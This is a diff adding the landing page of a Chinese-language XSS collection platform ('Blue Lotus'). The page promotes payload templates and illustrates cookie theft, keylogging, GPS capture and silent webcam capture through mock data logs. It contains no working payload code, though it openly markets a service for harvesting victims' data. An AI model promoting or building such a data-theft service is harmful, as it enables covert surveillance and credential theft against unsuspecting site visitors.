+                                <animate attributeName="opacity" values="1;0.2;1" dur="1s" repeatCount="indefinite"/>
+                            </circle>
+                            <text x="395" y="72" fill="#ff0040" font-size="9">REC</text>
+                            
+                            <!-- 控制按钮 -->
+                            <rect x="160" y="240" width="180" height="25" fill="rgba(255,102,0,0.2)" stroke="#ff6600" stroke-width="1" rx="5"/>
+                            <circle cx="250" cy="252" r="8" fill="#ff6600"/>
+                            <circle cx="250" cy="252" r="5" fill="#fff"/>
+                            <text x="210" y="257" fill="#888" font-size="9">拍照</text>
+                            <text x="270" y="257" fill="#888" font-size="9">上传</text>
+                            
+                            <!-- 状态信息 -->
+                            <text x="75" y="245" fill="#00ff41" font-size="8">✓ 已获取权限</text>
+                        </svg>
+                        <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">利用MediaDevices API静默拍照并上传到服务器</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 插图7: 数据回传日志 -->
+            <div class="illustration-box mt-5">
+                <h3 class="illustration-title">📋 实时数据回传日志</h3>
+                <svg width="100%" height="300" viewBox="0 0 1000 300" style="background: linear-gradient(to right, #0a0a0a 0%, #0a1a0a 25%, #1a0a0a 50%, #0a0a1a 75%, #0a0a0a 100%); border-radius: 8px;">
+                    <!-- 数据流背景 -->
+                    <defs>
+                        <linearGradient id="dataFlow" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" style="stop-color:#00ff41;stop-opacity:0.1"/>
+                            <stop offset="50%" style="stop-color:#00d4ff;stop-opacity:0.1"/>
+                            <stop offset="100%" style="stop-color:#ff0040;stop-opacity:0.1"/>
+                        </linearGradient>
+                    </defs>
+                    <!-- 数据流动线条 -->
+                    <rect x="0" y="0" width="1000" height="300" fill="url(#dataFlow)"/>
+                    <line x1="0" y1="50" x2="1000" y2="50" stroke="#00ff41" stroke-width="1" opacity="0.2">
+                        <animate attributeName="stroke-dashoffset" from="0" to="20" dur="2s" repeatCount="indefinite"/>
+                    </line>
+                    <line x1="0" y1="150" x2="1000" y2="150" stroke="#00d4ff" stroke-width="1" opacity="0.2">
+                        <animate attributeName="stroke-dashoffset" from="0" to="20" dur="1.5s" repeatCount="indefinite"/>
+                    </line>
+                    <line x1="0" y1="250" x2="1000" y2="250" stroke="#ff0040" stroke-width="1" opacity="0.2">
+                        <animate attributeName="stroke-dashoffset" from="0" to="20" dur="2.5s" repeatCount="indefinite"/>
+                    </line>
+                    <!-- 日志窗口 -->
+                    <rect x="30" y="30" width="940" height="240" fill="#1a1f3a" stroke="#00ff41" stroke-width="2" rx="8"/>
+                    <rect x="30" y="30" width="940" height="30" fill="#00ff41" rx="8 8 0 0"/>
+                    <text x="500" y="52" text-anchor="middle" fill="#000" font-size="14" font-weight="bold">📊 XSS数据收集日志 - 实时监控</text>
+                    
+                    <!-- 表头 -->
+                    <rect x="40" y="70" width="920" height="25" fill="#0a0e27"/>
+                    <text x="60" y="88" fill="#00ff41" font-size="11" font-weight="bold">时间</text>
+                    <text x="180" y="88" fill="#00ff41" font-size="11" font-weight="bold">IP地址</text>
+                    <text x="300" y="88" fill="#00ff41" font-size="11" font-weight="bold">类型</text>
+                    <text x="420" y="88" fill="#00ff41" font-size="11" font-weight="bold">数据内容</text>
+                    <text x="750" y="88" fill="#00ff41" font-size="11" font-weight="bold">状态</text>
+                    
+                    <!-- 日志条目 -->
+                    <rect x="40" y="100" width="920" height="30" fill="rgba(0,255,65,0.05)"/>
+                    <text x="60" y="120" fill="#0ff" font-size="10">12:34:56</text>
+                    <text x="180" y="120" fill="#888" font-size="10">192.168.1.100</text>
+                    <text x="300" y="120" fill="#ff6600" font-size="10">🍪 Cookie</text>
+                    <text x="420" y="120" fill="#ccc" font-size="9">session_id=abc123xyz...</text>
+                    <rect x="750" y="110" width="60" height="18" fill="rgba(0,255,65,0.2)" rx="3"/>
+                    <text x="780" y="123" text-anchor="middle" fill="#00ff41" font-size="9">成功</text>
+                    
+                    <rect x="40" y="135" width="920" height="30" fill="rgba(0,212,255,0.05)"/>
+                    <text x="60" y="155" fill="#0ff" font-size="10">12:35:12</text>
+                    <text x="180" y="155" fill="#888" font-size="10">10.0.0.25</text>
+                    <text x="300" y="155" fill="#9d00ff" font-size="10">⌨️ 键盘</text>
+                    <text x="420" y="155" fill="#ccc" font-size="9">keys: password123, admin...</text>
+                    <rect x="750" y="145" width="60" height="18" fill="rgba(0,255,65,0.2)" rx="3"/>
+                    <text x="780" y="158" text-anchor="middle" fill="#00ff41" font-size="9">成功</text>
+                    
+                    <rect x="40" y="170" width="920" height="30" fill="rgba(255,102,0,0.05)"/>
+                    <text x="60" y="190" fill="#0ff" font-size="10">12:35:45</text>
+                    <text x="180" y="190" fill="#888" font-size="10">172.16.0.88</text>
+                    <text x="300" y="190" fill="#00d4ff" font-size="10">📍 GPS</text>
+                    <text x="420" y="190" fill="#ccc" font-size="9">lat:39.915, lng:116.404</text>
+                    <rect x="750" y="180" width="60" height="18" fill="rgba(0,255,65,0.2)" rx="3"/>
+                    <text x="780" y="193" text-anchor="middle" fill="#00ff41" font-size="9">成功</text>
+                    
+                    <rect x="40" y="205" width="920" height="30" fill="rgba(255,0,64,0.05)"/>
+                    <text x="60" y="225" fill="#0ff" font-size="10">12:36:20</text>
+                    <text x="180" y="225" fill="#888" font-size="10">192.168.2.50</text>
+                    <text x="300" y="225" fill="#ff0040" font-size="10">📷 摄像头</text>
+                    <text x="420" y="225" fill="#ccc" font-size="9">image: base64_data...</text>
+                    <rect x="750" y="215" width="60" height="18" fill="rgba(255,102,0,0.2)" rx="3"/>
+                    <text x="780" y="228" text-anchor="middle" fill="#ff6600" font-size="9">处理中</text>
+                    
+                    <!-- 新日志动画提示 -->
+                    <rect x="40" y="240" width="920" height="25" fill="rgba(0,255,65,0.15)">
+                        <animate attributeName="opacity" values="0.15;0.4;0.15" dur="1.5s" repeatCount="indefinite"/>
+                    </rect>
+                    <text x="60" y="257" fill="#00ff41" font-size="10" font-weight="bold">● 新日志</text>
+                    <text x="150" y="257" fill="#0ff" font-size="10">12:36:58</text>
+                    <text x="250" y="257" fill="#888" font-size="10">正在接收数据...</text>
+                </svg>
+                <p style="text-align: center; color: var(--text-secondary); margin-top: 15px;">所有窃取的数据实时显示：Cookie、键盘记录、GPS定位、摄像头照片等一目了然</p>
+            </div>
+            
+            <!-- 功能特点 -->
+            <div class="row mt-5">
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <h4 style="color: var(--neon-green); margin-bottom: 1rem;">🚀 零配置部署</h4>
+                        <p style="color: var(--text-secondary); line-height: 1.8;">
+                            自动数据库初始化，内置所有依赖库，一键导入30+ Payload模板，支持Nginx/Apache
+                        </p>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <h4 style="color: var(--neon-green); margin-bottom: 1rem;">🔒 安全可靠</h4>
+                        <p style="color: var(--text-secondary); line-height: 1.8;">
+                            IP白名单/黑名单保护，用户权限隔离，SQL注入防护（PDO预处理），XSS输出过滤
+                        </p>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <h4 style="color: var(--neon-green); margin-bottom: 1rem;">📱 响应式设计</h4>
+                        <p style="color: var(--text-secondary); line-height: 1.8;">
+                            完美适配桌面/平板/手机，Bootstrap 5响应式栅格，移动端优化交互
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+        </div>
+    </section>
+    
+    <!-- 立即开始 -->
+    <section class="py-5" style="background: rgba(0, 255, 65, 0.05);">
+        <div class="container text-center">
+            <h2 class="section-title">准备好开始了吗？</h2>
+            <p class="text-muted mb-4" style="font-size: 1.2rem;">想要获得更好的技术服务？请点击下方联系我们</p>
+            <button class="cta-button me-3" onclick="window.location.href='login.php'">
+                <span><i class="fas fa-sign-in-alt"></i> 登录平台</span>
+            </button>
+            <button class="cta-button" onclick="window.open('https://hackhub.org/contact-us.html', '_blank')">
+                <span>
+                    <svg width="18" height="18" viewBox="0 0 496 512" fill="currentColor" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
+                        <path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/>
+                    </svg>
+                    联系我们
+                </span>
+            </button>
+        </div>
+    </section>
+    
+    <!-- 页脚 -->
+    <footer class="footer" role="contentinfo">
+        <div class="container-fluid">
+            <div class="footer-content">
+                <div class="footer-copyright">
+                    <span>© 2025 蓝莲花XSS在线平台</span>
+                    <span class="text-tertiary">|</span>
+                    <span class="text-secondary">v2.0.8</span>
+                </div>
+                <nav class="footer-links" aria-label="Footer navigation">
+                    <a href="https://xss.li" target="_blank" rel="noopener noreferrer">
+                        <i class="fas fa-globe" aria-hidden="true"></i> XSS.li
+                    </a>
+                                        <a href="https://xss.li/sitemap.php" target="_blank" rel="noopener noreferrer">
+                        <i class="fas fa-link" aria-hidden="true"></i> Sitemap
+                    </a>
+                    <a href="https://hackhub.org" target="_blank" rel="noopener noreferrer">
+                        <i class="fas fa-link" aria-hidden="true"></i> 技术支持
+                    </a>
+                </nav>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- 灯箱模态框 -->
+    <div id="lightbox" class="lightbox">
+        <span class="lightbox-close">&times;</span>
+        <div class="lightbox-content">
+            <img id="lightbox-img" src="" alt="">
+            <div class="lightbox-caption"></div>
+        </div>
+        <button class="lightbox-prev">&#10094;</button>
+        <button class="lightbox-next">&#10095;</button>
+    </div>
+    
+    <script src="static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // 语言切换功能
+        let currentLang = localStorage.getItem('language') || 'zh';
+        
+        // 中英文文本对照表
+        const translations = {
+            zh: {
+                heroTitle: '蓝莲花XSS在线平台',
+                heroSubtitle: '全网功能最强大的XSS系统包含知识库Payload调试',
+                btnLogin: '登录注册',
+                btnLearnMore: '了解更多',
+                statXssSubmit: 'XSS请求提交',
+                statActiveUsers: '活跃用户',
+                statPayload: 'Payload(每周更新)',
+                statStability: '平台稳定性',
+                sectionGallery: '平台界面展示',
+                sectionFeatures: '核心功能特性',
+                sectionAdvantages: '平台优势',
+                sectionUseCases: '适用场景',
+                sectionCta: '准备好开始了吗？',
+                ctaDescription: '想要获得更好的技术服务？请点击下方联系我们',
+                btnLoginPlatform: '登录平台',
+                btnContactUs: '联系我们',
+                testBtn: 'Payload测试',
+                wikiBtn: 'XSS知识库',
+                serviceBtn: '技术服务',
+                // 图片展示标签
+                imgConsole: '控制台界面',
+                imgLog: '日志分析',
+                imgPayload: 'Payload管理',
+                imgConfig: '配置中心',
+                // 核心功能
+                featureRealtime: '实时XSS检测',
+                featureRealtimeDesc: '先进的XSS漏洞检测引擎，实时监控并捕获跨站脚本攻击，支持DOM、反射型和存储型XSS检测。',
+                featurePayload: '智能Payload管理',
+                featurePayloadDesc: '内置丰富的XSS Payload库，支持自定义编辑、分类管理和一键部署，让测试更高效。',
+                featureLog: '详细日志分析',
+                featureLogDesc: '完整记录每次XSS触发的详细信息，包括Cookie、User-Agent、来源等，支持数据导出和可视化分析。',
+                featureTemplate: 'XSS模板库系统',
+                featureTemplateDesc: '预置多种经典XSS攻击模板，快速创建测试用例，支持模板导入导出和在线编辑。',
+                featureConfig: '安全配置管理',
+                featureConfigDesc: '灵活的平台配置选项，支持域名绑定、邮箱通知、Webhook集成等，满足各种安全测试需求。',
+                featurePerf: '高性能架构',
+                featurePerfDesc: '采用现代化技术栈，响应速度快，支持高并发，确保测试过程稳定可靠。',
+                // 平台优势
+                advOpenSource: '完全开源免费',
+                advOpenSourceDesc: '所有代码开源，无任何隐藏费用，支持私有化部署，数据完全掌控在自己手中。',
+                advSecurity: '安全可靠',
+                advSecurityDesc: '企业级安全防护，数据加密存储，完善的权限管理，确保测试数据安全。',
+                advDeploy: '快速部署',
+                advDeployDesc: '支持Docker一键部署，配置简单，5分钟即可启动您的XSS测试平台。',
+                advCommunity: '社区支持',
+                advCommunityDesc: '活跃的开发者社区，持续更新维护，丰富的文档和示例，技术支持随时在线。',
+                // 使用场景
+                useResearch: 'Web安全研究',
+                useResearchDesc: 'Web安全研究人员进行XSS漏洞分析和测试',
+                useEducation: '网络安全教学',
+                useEducationDesc: '网络安全课程实验和CTF竞赛训练平台',
+                usePentest: '渗透测试工具',
+                usePentestDesc: '安全团队进行Web应用漏洞挖掘和验证',
+                useEnterprise: '企业安全防护',
+                useEnterpriseDesc: '企业内部安全测试和员工安全意识培训'
+            },
+            en: {
+                heroTitle: 'Blue Lotus XSS Platform',
+                heroSubtitle: 'Professional XSS Security Testing System · Register Now · 100% Open Source & Free',
+                btnLogin: 'Login / Register',
+                btnLearnMore: 'Learn More',
+                statXssSubmit: 'XSS Requests',
+                statActiveUsers: 'Active Users',
+                statPayload: 'Payload (Weekly Update)',
+                statStability: 'Platform Stability',
+                sectionGallery: 'Platform Interface',
+                sectionFeatures: 'Core Features',
+                sectionAdvantages: 'Platform Advantages',
+                sectionUseCases: 'Use Cases',
+                sectionCta: 'Ready to Start?',
+                ctaDescription: 'Want better technical service? Click below to contact us',
+                btnLoginPlatform: 'Login Platform',
+                btnContactUs: 'Contact Us',
+                testBtn: 'Payload Test',
+                wikiBtn: 'XSS Wiki',
+                serviceBtn: 'Tech Support',
+                // 图片展示标签
+                imgConsole: 'Console Interface',
+                imgLog: 'Log Analysis',
+                imgPayload: 'Payload Management',
+                imgConfig: 'Configuration Center',
+                // 核心功能
+                featureRealtime: 'Real-time XSS Detection',
+                featureRealtimeDesc: 'Advanced XSS vulnerability detection engine that monitors and captures cross-site scripting attacks in real-time, supporting DOM, reflected, and stored XSS detection.',
+                featurePayload: 'Smart Payload Management',
+                featurePayloadDesc: 'Built-in rich XSS Payload library with custom editing, categorized management, and one-click deployment for more efficient testing.',
+                featureLog: 'Detailed Log Analysis',
+                featureLogDesc: 'Complete recording of detailed information for each XSS trigger, including Cookie, User-Agent, source, etc., with data export and visualization analysis support.',
+                featureTemplate: 'XSS Template Library System',
+                featureTemplateDesc: 'Pre-configured classic XSS attack templates for quick test case creation, with template import/export and online editing support.',
+                featureConfig: 'Security Configuration Management',
+                featureConfigDesc: 'Flexible platform configuration options supporting domain binding, email notifications, Webhook integration, etc., meeting various security testing needs.',
+                featurePerf: 'High-Performance Architecture',
+                featurePerfDesc: 'Modern technology stack with fast response time and high concurrency support, ensuring stable and reliable testing process.',
+                // 平台优势
+                advOpenSource: 'Fully Open Source & Free',
+                advOpenSourceDesc: 'All code is open source with no hidden fees, supporting private deployment, with complete control over your data.',
+                advSecurity: 'Secure & Reliable',
+                advSecurityDesc: 'Enterprise-level security protection with encrypted data storage and comprehensive permission management, ensuring test data security.',
+                advDeploy: 'Quick Deployment',
+                advDeployDesc: 'Supports Docker one-click deployment with simple configuration, launching your XSS testing platform in 5 minutes.',
+                advCommunity: 'Community Support',
+                advCommunityDesc: 'Active developer community with continuous updates and maintenance, rich documentation and examples, technical support always available.',
+                // 使用场景
+                useResearch: 'Web Security Research',
+                useResearchDesc: 'Web security researchers conduct XSS vulnerability analysis and testing',
+                useEducation: 'Cybersecurity Education',
+                useEducationDesc: 'Network security course labs and CTF competition training platform',
+                usePentest: 'Penetration Testing Tool',
+                usePentestDesc: 'Security teams conduct web application vulnerability discovery and verification',
+                useEnterprise: 'Enterprise Security Protection',
+                useEnterpriseDesc: 'Internal enterprise security testing and employee security awareness training'
+            }
+        };
+        
+        // 初始化语言
+        function initLanguage() {
+            const langBtn = document.getElementById('lang-text');
+            if (currentLang === 'zh') {
+                langBtn.textContent = 'EN';
+            } else {
+                langBtn.textContent = '中文';
+            }
+            updatePageContent();
+        }
+        
+        // 切换语言
+        function toggleLanguage() {
+            currentLang = currentLang === 'zh' ? 'en' : 'zh';
+            localStorage.setItem('language', currentLang);
+            const langBtn = document.getElementById('lang-text');
+            
+            if (currentLang === 'zh') {
+                langBtn.textContent = 'EN';
+            } else {
+                langBtn.textContent = '中文';
+            }
+            
+            updatePageContent();
+        }
+        
+        // 更新页面内容
+        function updatePageContent() {
+            const t = translations[currentLang];
+            
+            // 更新各个文本
+            const heroTitle = document.querySelector('.hero-title');
+            const heroSubtitle = document.querySelector('.hero-subtitle');
+            if (heroTitle) heroTitle.textContent = t.heroTitle;
+            if (heroSubtitle) heroSubtitle.textContent = t.heroSubtitle;
+            
+            // 更新统计标签
+            const statLabels = document.querySelectorAll('.counter-label');
+            if (statLabels.length >= 4) {
+                statLabels[0].textContent = t.statXssSubmit;
+                statLabels[1].textContent = t.statActiveUsers;
+                statLabels[2].textContent = t.statPayload;
+                statLabels[3].textContent = t.statStability;
+            }
+            
+            // 更新段落标题
+            const sectionTitles = document.querySelectorAll('.section-title');
+            if (sectionTitles.length >= 5) {
+                sectionTitles[0].textContent = t.sectionGallery;
+                sectionTitles[1].textContent = t.sectionFeatures;
+                sectionTitles[2].textContent = t.sectionAdvantages;
+                sectionTitles[3].textContent = t.sectionUseCases;
+                sectionTitles[4].textContent = t.sectionCta;
+            }
+            
+            // 更新图片展示标签
+            const galleryLabels = document.querySelectorAll('.gallery-overlay .overlay-content p');
+            if (galleryLabels.length >= 4) {
+                galleryLabels[0].textContent = t.imgConsole;
+                galleryLabels[1].textContent = t.imgLog;
+                galleryLabels[2].textContent = t.imgPayload;
+                galleryLabels[3].textContent = t.imgConfig;
+            }
+            
+            // 更新核心功能标题和描述
+            const featureTitles = document.querySelectorAll('.feature-card h3');
+            const featureDescs = document.querySelectorAll('.feature-card .text-muted');
+            if (featureTitles.length >= 6 && featureDescs.length >= 6) {
+                featureTitles[0].textContent = t.featureRealtime;
+                featureDescs[0].textContent = t.featureRealtimeDesc;
+                featureTitles[1].textContent = t.featurePayload;
+                featureDescs[1].textContent = t.featurePayloadDesc;
+                featureTitles[2].textContent = t.featureLog;
+                featureDescs[2].textContent = t.featureLogDesc;
+                featureTitles[3].textContent = t.featureTemplate;
+                featureDescs[3].textContent = t.featureTemplateDesc;
+                featureTitles[4].textContent = t.featureConfig;
+                featureDescs[4].textContent = t.featureConfigDesc;
+                featureTitles[5].textContent = t.featurePerf;
+                featureDescs[5].textContent = t.featurePerfDesc;
+            }
+            
+            // 更新平台优势
+            const advTitles = document.querySelectorAll('.card h4');
+            const advDescs = document.querySelectorAll('.card .text-muted');
+            if (advTitles.length >= 4 && advDescs.length >= 4) {
+                // 提取纯文本（去掉图标）
+                const advTexts = [
+                    t.advOpenSource,
+                    t.advSecurity,
+                    t.advDeploy,
+                    t.advCommunity
+                ];
+                advTitles.forEach((title, index) => {
+                    if (index < 4) {
+                        const icon = title.querySelector('i');
+                        if (icon) {
+                            title.innerHTML = icon.outerHTML + ' ' + advTexts[index];
+                        } else {
+                            title.textContent = advTexts[index];
+                        }
+                    }
+                });
+                advDescs[0].textContent = t.advOpenSourceDesc;
+                advDescs[1].textContent = t.advSecurityDesc;
+                advDescs[2].textContent = t.advDeployDesc;
+                advDescs[3].textContent = t.advCommunityDesc;
+            }
+            
+            // 更新使用场景
+            const useCaseTitles = document.querySelectorAll('[aria-labelledby="use-cases-title"] h5');
+            const useCaseDescs = document.querySelectorAll('[aria-labelledby="use-cases-title"] .text-muted');
+            if (useCaseTitles.length >= 4 && useCaseDescs.length >= 4) {
+                useCaseTitles[0].textContent = t.useResearch;
+                useCaseDescs[0].textContent = t.useResearchDesc;
+                useCaseTitles[1].textContent = t.useEducation;
+                useCaseDescs[1].textContent = t.useEducationDesc;
+                useCaseTitles[2].textContent = t.usePentest;
+                useCaseDescs[2].textContent = t.usePentestDesc;
+                useCaseTitles[3].textContent = t.useEnterprise;
+                useCaseDescs[3].textContent = t.useEnterpriseDesc;
+            }
+            
+            // 更新CTA区域
+            const ctaDesc = document.querySelector('.py-5[style*="background: rgba(0, 255, 65, 0.05)"] p');
+            if (ctaDesc) ctaDesc.textContent = t.ctaDescription;
+            
+            const ctaButtons = document.querySelectorAll('.py-5[style*="background: rgba(0, 255, 65, 0.05)"] .cta-button span');
+            if (ctaButtons.length >= 2) {
+                ctaButtons[0].innerHTML = '<i class="fas fa-sign-in-alt"></i> ' + t.btnLoginPlatform;
+                ctaButtons[1].innerHTML = '<svg width="18" height="18" viewBox="0 0 496 512" fill="currentColor" style="display: inline-block; vertical-align: middle; margin-right: 8px;"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/></svg> ' + t.btnContactUs;
+            }
+            
+            // 更新测试按钮
+            const testBtn = document.querySelectorAll('.floating-nav .nav-btn .btn-text')[0];
+            if (testBtn) testBtn.textContent = t.testBtn;
+            
+            // 更新功能库按钮
+            const wikiBtn = document.querySelector('.wiki-btn .btn-text');
+            if (wikiBtn) wikiBtn.textContent = t.wikiBtn;
+            
+            // 更新技术服务按钮
+            const serviceBtn = document.querySelector('.service-btn .btn-text');
+            if (serviceBtn) serviceBtn.textContent = t.serviceBtn;
+            
+            // 更新导航栏登录按钮
+            const loginBtn = document.querySelectorAll('.floating-nav .nav-btn .btn-text')[3];
+            if (loginBtn) loginBtn.textContent = t.btnLogin;
+        }
+        
+        // 页面加载时初始化语言
+        window.addEventListener('load', () => {
+            initLanguage();
+        });
+        
+        // 终端打字效果
+        const terminalText = `$ <span style="color: #00ffff;">initialize</span> blue-lotus-xss
+<span style="color: #00ff41;">✓</span> Loading security modules...
+<span style="color: #00ff41;">✓</span> Starting XSS detection engine...
+<span style="color: #00ff41;">✓</span> Initializing payload library...
+<span style="color: #00ff41;">✓</span> Platform ready!
+
+Welcome to <span style="color: #00ff41;">蓝莲花 XSS Platform - XSS.li</span>`;
+        
+        let i = 0;
+        const speed = 30;
+        const terminalElement = document.getElementById('terminal-text');
+        
+        function typeWriter() {
+            if (i < terminalText.length) {
+                const char = terminalText.charAt(i);
+                if (char === '<') {
+                    const closeTag = terminalText.indexOf('>', i);
+                    terminalElement.innerHTML += terminalText.substring(i, closeTag + 1);
+                    i = closeTag + 1;
+                } else {
+                    terminalElement.innerHTML += char;
+                    i++;
+                }
+                setTimeout(typeWriter, speed);
+            } else {
+                terminalElement.innerHTML += '<span class="cursor"></span>';
+            }
+        }
+        
+        // 页面加载后启动打字效果
+        window.addEventListener('load', () => {
+            setTimeout(typeWriter, 500);
+        });
+        
+        // 数字滚动动画
+        function animateCounters() {
+            const counters = document.querySelectorAll('.counter-value');
+            
+            counters.forEach(counter => {
+                const target = parseInt(counter.getAttribute('data-target'));
+                const duration = 2000;
+                const step = target / (duration / 16);
+                let current = 0;
+                
+                const updateCounter = () => {
+                    current += step;
+                    if (current < target) {
+                        counter.textContent = Math.floor(current);
+                        requestAnimationFrame(updateCounter);
+                    } else {
+                        counter.textContent = target;
+                    }
+                };
+                
+                updateCounter();
+            });
+        }
+        
+        // 监听滚动触发动画
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    animateCounters();
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.5 });
+        
+        document.querySelectorAll('.stats-counter').forEach(counter => {
+            observer.observe(counter);
+        });
+        
+        // 生成浮动粒子
+        function createParticles() {
+            const container = document.getElementById('particles');
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                container.appendChild(particle);
+            }
+        }
+        
+        createParticles();
+        
+        // 平滑滚动
+        function scrollToSection(id) {
+            const element = document.getElementById(id);
+            if (element) {
+                element.scrollIntoView({ 
+                    behavior: 'smooth' 
+                });
+            }
+        }
+        
+        // 代码行动画观察器
+        const codeObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const codeLines = entry.target.querySelectorAll('.code-line');
+                    codeLines.forEach((line, index) => {
+                        line.style.animationDelay = (index * 0.1) + 's';
+                    });
+                }
+            });
+        }, { threshold: 0.3 });
+        
+        document.querySelectorAll('.code-example').forEach(code => {
+            codeObserver.observe(code);
+        });
+        
+        // 回到顶部按钮功能
+        const backToTopBtn = document.getElementById('backToTop');
+        
+        // 监听滚动事件
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        
+        // 点击回到顶部
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+        
+        // 灯箱功能
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        const lightboxCaption = document.querySelector('.lightbox-caption');
+        const lightboxClose = document.querySelector('.lightbox-close');
+        const lightboxPrev = document.querySelector('.lightbox-prev');
+        const lightboxNext = document.querySelector('.lightbox-next');
+        
+        // 获取所有图片容器
+        const galleryItems = document.querySelectorAll('.gallery-item');
+        let currentImageIndex = 0;
+        
+        // 为每个图片容器添加点击事件
+        galleryItems.forEach((item, index) => {
+            item.addEventListener('click', function() {
+                const img = this.querySelector('.gallery-image');
+                currentImageIndex = index;
+                openLightbox(img);
+            });
+            // 添加鼠标样式提示
+            item.style.cursor = 'pointer';
+        });
+        
+        // 打开灯箱
+        function openLightbox(img) {
+            lightboxImg.src = img.src;
+            lightboxCaption.textContent = img.alt;
+            lightbox.classList.add('active');
+            document.body.style.overflow = 'hidden'; // 防止背景滚动
+        }
+        
+        // 关闭灯箱
+        function closeLightbox() {
+            lightbox.classList.remove('active');
+            document.body.style.overflow = ''; // 恢复滚动
+        }
+        
+        // 显示上一张图片
+        function showPrevImage() {
+            currentImageIndex = (currentImageIndex - 1 + galleryItems.length) % galleryItems.length;
+            const img = galleryItems[currentImageIndex].querySelector('.gallery-image');
+            openLightbox(img);
+        }
+        
+        // 显示下一张图片
+        function showNextImage() {
+            currentImageIndex = (currentImageIndex + 1) % galleryItems.length;
+            const img = galleryItems[currentImageIndex].querySelector('.gallery-image');
+            openLightbox(img);
+        }
+        
+        // 关闭按钮点击事件
+        lightboxClose.addEventListener('click', closeLightbox);
+        
+        // 点击背景关闭
+        lightbox.addEventListener('click', function(e) {
+            if (e.target === lightbox) {
+                closeLightbox();
+            }
+        });
+        
+        // 上一张/下一张按钮
+        lightboxPrev.addEventListener('click', showPrevImage);
+        lightboxNext.addEventListener('click', showNextImage);
+        
+        // 键盘快捷键
+        document.addEventListener('keydown', function(e) {
+            if (!lightbox.classList.contains('active')) return;
+            
+            if (e.key === 'Escape') {
+                closeLightbox();
+            } else if (e.key === 'ArrowLeft') {
+                showPrevImage();
+            } else if (e.key === 'ArrowRight') {
+                showNextImage();
+            }
+        });
+    </script>
+</body>
+</html>
